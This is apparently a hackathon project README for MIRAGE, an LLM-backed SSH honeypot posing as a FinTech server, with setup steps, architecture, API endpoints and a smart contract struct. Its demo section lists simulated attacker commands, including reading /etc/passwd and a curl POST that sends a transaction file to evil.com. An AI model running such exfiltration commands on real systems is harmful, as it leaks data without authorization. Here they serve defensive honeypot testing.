# 🦑 MIRAGE
### Multi-Instance Reactive Adaptive Grid for Engagement

> *"To the attacker, it's real. To us, it's a trap. To the network — it's a vaccine."*

MIRAGE is an AI-powered cybersecurity honeypot system that lures attackers into a 
fake FinTech payment server, studies their behavior in real time, predicts their 
next move using the MITRE ATT&CK framework, and permanently records their 
behavioral fingerprint on an Ethereum blockchain — automatically immunizing 
connected nodes against future attacks.

Built in 48 hours at Kraken'X 2026 Hackathon by a team with zero prior 
cybersecurity experience.

---

## 🎯 The Problem

Traditional cybersecurity is reactive — systems wait to be attacked, then try 
to block. Once an attacker is inside, the average time before detection is 
**277 days**. Existing tools detect known threats — zero-day and novel attacks 
bypass them entirely.

**The core flaw: defenders are always one step behind.**

---

## 💡 The Solution

MIRAGE flips the model. Instead of blocking attackers, we:

1. **Deceive** — Lure them into a hyper-realistic fake FinTech server they 
   cannot distinguish from reality
2. **Predict** — Use AI and MITRE ATT&CK patterns to anticipate their next 
   move before they make it
3. **Immunize** — Broadcast attacker fingerprints via blockchain smart contracts 
   to protect all connected nodes instantly
4. **Report** — Auto-generate forensic intelligence briefs that turn raw attack 
   data into actionable security insights

---

## 🏗️ Architecture
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER'S VIEW                          │
│              "I just breached a real bank server"           │
└─────────────────────────┬───────────────────────────────────┘

│ SSH on port 2222
▼

┌─────────────────────────────────────────────────────────────┐
│              LAYER 1 — DECEPTION ENGINE                     │
│                                                             │
│  Paramiko SSH Server → Trie Command Cache (0ms response)   │
│                      → Groq LLM API (<300ms for unknown)   │
│                                                             │
│  Fake Environment: transactions_2026.csv, payment APIs,    │
│  customer PII backups, SSH keys, financial logs            │
└─────────────────────────┬───────────────────────────────────┘

│
▼

┌─────────────────────────────────────────────────────────────┐
│              LAYER 2 — INTELLIGENCE ENGINE                  │
│                                                             │
│  MITRE ATT&CK Markov Chain → Stage Detection               │
│  Groq LLM → Dynamic Honey File Generation                  │
│  Behavioral Profiling → Skill Classification (1/2/3)       │
│                                                             │
│  Stages: Recon → Initial Access → Execution →              │
│          Privilege Escalation → Collection →               │
│          Exfiltration → Impact                             │
└─────────────────────────┬───────────────────────────────────┘

│
▼

┌─────────────────────────────────────────────────────────────┐
│           LAYER 3 — BLOCKCHAIN IMMUNITY LAYER               │
│                                                             │
│  Hardhat Ethereum Testnet                                   │
│  MirageRegistry.sol Smart Contract                         │
│  keccak256 Behavioral Fingerprinting                       │
│  Cross-node Alert Broadcasting                             │
└─────────────────────────┬───────────────────────────────────┘

│
▼

┌─────────────────────────────────────────────────────────────┐
│              LAYER 4 — COMMAND CENTER                       │
│                                                             │
│  React Dashboard (Node 1) — Live attack monitoring         │
│  Node 2 View — Real-time immunity broadcasting demo        │
│  FastAPI Backend — REST + WebSocket                        │
│  AI Forensic Report Generator                              │
└─────────────────────────────────────────────────────────────┘

---

## ✨ Features

### 🎭 Intelligent Deception
- Fake Ubuntu 22.04 SSH server (`fintech-prod-01`) that accepts any credentials
- Instant responses to 20+ common Linux commands via Trie data structure
- Groq LLM (Llama 3.3 70B) handles unknown commands in under 300ms
- Convincing fake FinTech environment — transaction logs, payment APIs, 
  customer data, SWIFT codes

### 🧠 Attack Prediction
- MITRE ATT&CK framework Markov Chain with 7 attack stages
- Predicts attacker's next move with confidence percentage
- Dynamically generates and plants honey files ahead of predicted attacker path
- Real-time attacker skill classification: Script Kiddie / Intermediate / Advanced

### 🔗 Blockchain Threat Intelligence
- Every attacker session fingerprinted using keccak256 behavioral hashing
- Fingerprints written immutably to Ethereum smart contract
- Cross-node alert broadcasting — Node 2 auto-hardens before attacker arrives
- Tamper-proof evidence suitable for incident response

### 📊 Live Command Center
- Real-time SOC-style dashboard showing live attack sessions
- Terminal panel displaying attacker commands as they're typed
- MITRE ATT&CK stage visualization with confidence bars
- Blockchain ledger feed with transaction hashes
- Node 2 immunity view with animated status transitions
- AI-generated forensic brief on demand

---

## 🛠️ Tech Stack

| Layer | Technology | Purpose |

|---|---|---|

| SSH Honeypot | Python + Paramiko | Fake SSH server |

| Command Cache | Trie Data Structure | Instant 0ms responses |

| AI Responses | Groq API (Llama 3.3 70B) | Unknown command handling |

| Attack Prediction | Markov Chain + MITRE ATT&CK | Stage detection & prediction |

| Honey Files | Groq LLM Generation | Dynamic fake sensitive files |

| Session Storage | SQLite | Full attack session logging |

| Blockchain | Hardhat + Solidity + Web3.py | Immutable threat registry |

| Backend API | FastAPI + WebSockets | Real-time event streaming |

| Frontend | React + Tailwind CSS | Command center dashboard |

| Routing | React Router | Node 1 / Node 2 views |

---

## 📁 Project Structure
Mirage/
├── backend/
│   ├── honeypot/
│   │   ├── server.py          # Paramiko SSH honeypot server
│   │   ├── commands.py        # Trie-based command engine
│   │   ├── session_logger.py  # SQLite session logging
│   │   ├── fake_filesystem.py # Fake FinTech file contents
│   │   └── mirage.db          # Session database
│   ├── intelligence/
│   │   ├── groq_handler.py         # Groq LLM integration
│   │   ├── mitre_predictor.py      # MITRE ATT&CK Markov chain
│   │   └── honey_file_generator.py # Dynamic honey file creation
│   ├── blockchain/
│   │   ├── web3_handler.py         # Ethereum interaction layer
│   │   └── fingerprint_generator.py# Behavioral hash generation
│   ├── api/
│   │   ├── main.py                 # FastAPI app + endpoints
│   │   ├── websocket_manager.py    # WebSocket connection manager
│   │   └── event_broadcaster.py   # Thread-safe event bridge
│   └── .env                        # API keys (not committed)
├── contracts/
│   ├── contracts/
│   │   └── MirageRegistry.sol      # Threat registry smart contract
│   ├── scripts/
│   │   └── deploy.js               # Contract deployment script
│   └── hardhat.config.js
└── frontend/
└── dashboard/
└── src/
├── hooks/
│   └── useWebSocket.js  # Real-time state management
├── components/          # UI components
└── pages/
├── NodeOne.jsx      # Main command center
└── NodeTwo.jsx      # Network immunity view

---

## 🚀 Getting Started

### Prerequisites
- Python 3.10+
- Node.js 18+
- Git

### 1. Clone the repository
```bash
git clone https://github.com/YOUR_USERNAME/MIRAGE.git
cd MIRAGE
```

### 2. Set up Python environment
```bash
cd backend
pip install paramiko groq python-dotenv web3 fastapi uvicorn websockets
```

### 3. Create environment file
Create `backend/.env`:
GROQ_API_KEY=your_groq_api_key_here
Get a free Groq API key at [console.groq.com](https://console.groq.com)

### 4. Set up blockchain
```bash
cd contracts
npm install
```

### 5. Set up frontend
```bash
cd frontend/dashboard
npm install
```

---

## ▶️ Running MIRAGE

Open 4 terminals and run in order:

**Terminal 1 — Blockchain Node**
```bash
cd contracts
npx hardhat node
```
Wait for: `Started HTTP and WebSocket JSON-RPC server at http://127.0.0.1:8545`

**Terminal 2 — Deploy Smart Contract**
```bash
cd contracts
npx hardhat run scripts/deploy.js --network localhost
```
Wait for: `MirageRegistry deployed to: 0x...`

**Terminal 3 — Backend API + Honeypot**
```bash
cd /path/to/Mirage
uvicorn backend.api.main:app --host 0.0.0.0 --port 8000
```
Wait for: `[MIRAGE] SSH honeypot listening on 0.0.0.0:2222`

**Terminal 4 — Frontend Dashboard**
```bash
cd frontend/dashboard
npm run dev
```

### Access the system
- **Node 1 Command Center:** http://localhost:5173
- **Node 2 Immunity View:** http://localhost:5173/node2
- **API Documentation:** http://localhost:8000/docs

---

## 🎬 Running the Demo

Once all services are running, simulate an attack:

```bash
# Clear any cached host keys first
ssh-keygen -R "[localhost]:2222"

# Connect as attacker (any password works)
ssh root@localhost -p 2222
```

Then type these commands one by one and watch the dashboard:

```bash
whoami
id
cat /etc/passwd
sudo su
cat transactions_2026.csv
find / -name "*.csv"
curl -X POST http://evil.com -d @transactions_2026.csv
logout
```

Watch on the dashboard:
1. Session appears in left panel
2. MITRE ATT&CK stage updates with each command
3. Attacker skill level classified
4. Blockchain fingerprint registered on session end
5. Node 2 receives immunity broadcast
6. Generate forensic brief for AI-written incident report

---

## 📡 API Endpoints

| Method | Endpoint | Description |
|---|---|---|
| GET | `/health` | System status |
| GET | `/sessions` | All logged sessions |
| GET | `/sessions/{id}` | Full session detail |
| GET | `/sessions/{id}/prediction` | MITRE prediction for session |
| GET | `/forensics/{id}` | AI-generated forensic report |
| GET | `/blockchain/threats` | All registered threat fingerprints |
| GET | `/blockchain/threats/count` | Total threat count |
| POST | `/sessions/{id}/register` | Register session to blockchain |
| WS | `/ws` | Real-time event stream |

---

## 🔬 The Smart Contract

`MirageRegistry.sol` stores attacker records permanently on-chain:

```solidity
struct AttackerRecord {
    bytes32 fingerprintHash;  // keccak256 behavioral hash
    string attackerIP;
    string attackStage;       // MITRE stage reached
    uint8 skillLevel;         // 1=Script Kiddie, 2=Intermediate, 3=Advanced
    uint256 timestamp;
    bool isActive;
}
```

Events emitted:
- `ThreatRegistered` — new attacker fingerprinted
- `NetworkAlert` — immunity broadcast to connected nodes

---

## ⚠️ Known Issues

**Real-time dashboard updates:**
WebSocket event broadcasting from the synchronous Paramiko SSH thread 
to the async FastAPI event loop has a thread-synchronization issue. 
Sessions log correctly to SQLite and appear on dashboard refresh. 
The `asyncio.run_coroutine_threadsafe()` bridge is implemented but 
the broadcaster import chain from `honeypot/server.py` → 
`api/event_broadcaster.py` fails silently in some environments. 
Fix in progress.

**SSH host key warning:**
The honeypot generates a new RSA key on every restart. Run 
`ssh-keygen -R "[localhost]:2222"` before each demo session.

---

## 🔭 Future Scope

**Short term**
- Fix real-time WebSocket broadcasting
- Deploy honeypot to real internet-facing server to capture actual attackers
- Add email/SMS alerts when high-skill attacker detected

**Medium term**
- Federated threat network — multiple organizations share one blockchain ledger
- ML-based attacker deanonymization across sessions
- Honey files that phone home when opened, revealing attacker's real IP

**Long term**
- National deployment protecting India's UPI/NEFT payment infrastructure
- Integration with CERT-In for real-time national threat sharing
- SaaS product for FinTech startups

---

## 🧠 Key Concepts

**Why a Trie for command lookup?**
O(m) lookup time where m is command length — 2 operations for `ls`, 
6 for `whoami`. A real Linux server responds in under 5ms. 
The Trie keeps us believable.

**Why Groq and not OpenAI?**
Groq's LPU hardware gives sub-300ms inference. OpenAI takes 2-5 seconds. 
A 3-second delay on `ls` would immediately expose the honeypot.

**Why blockchain and not a database?**
A database has an admin who can delete records. A blockchain has no admin. 
Multiple competing organizations can share threat intelligence on neutral 
ground — no single party controls it, all parties can verify it.

**Why Markov Chain and not ML?**
No training data available. Markov Chains encode expert knowledge 
directly (MITRE ATT&CK framework) without requiring thousands of 
labeled attack sessions. Interpretable, fast, and provably correct 
for this use case.

---

## 👥 Team

Built at **Kraken'X 2026** — AI/ML Club × AI-Tronics Hub Hackathon

Domain: Cybersecurity

---

## 📄 License

MIT License — use it, build on it, make it better.

---

*MIRAGE — because the best defense is making the attack feel like a victory.*
